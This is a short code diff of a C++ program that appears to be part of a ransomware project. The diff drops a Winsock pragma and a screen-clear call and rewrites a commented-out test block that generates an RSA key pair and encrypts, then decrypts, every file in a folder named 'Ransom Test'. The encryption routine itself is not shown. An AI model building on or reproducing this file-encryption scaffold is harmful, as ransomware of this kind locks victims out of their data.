@@ -3,8 +3,6 @@
 
 #include <csignal>
 
-#pragma comment(lib, "ws2_32.lib")
-
 bool abortApp = false;
 
 void SignalHandler(int signal) {
@@ -32,15 +30,16 @@ int main() {
         std::this_thread::sleep_for(std::chrono::seconds(1));
     }
 
-    system("cls");
-
     return 0;
 }
 
 // encrypting files in a directory
-//std::string cwd = "C:\\Users\\ethan\\Desktop\\Ransom Test";
-//RSAKeys keys = LGCrypto::GenerateRSAPair(2048);
-//
-//FileManager mgr(keys.pub);
-//mgr.FindFiles(cwd);
-//mgr.OutputFoundFiles(keys.priv);
+// std::string cwd = "C:\\Users\\ethan\\Desktop\\Ransom Test";
+// RSAKeys keys = LGCrypto::GenerateRSAPair(2048);
+// 
+// FileManager mgr;
+// mgr.SetPrivateKey(keys.priv);
+// mgr.SetPublicKey(keys.pub);
+// 
+// mgr.TransformFiles(cwd, &FileManager::EncryptContents, mgr);
+// mgr.TransformFiles(cwd, &FileManager::DecryptContents, mgr);
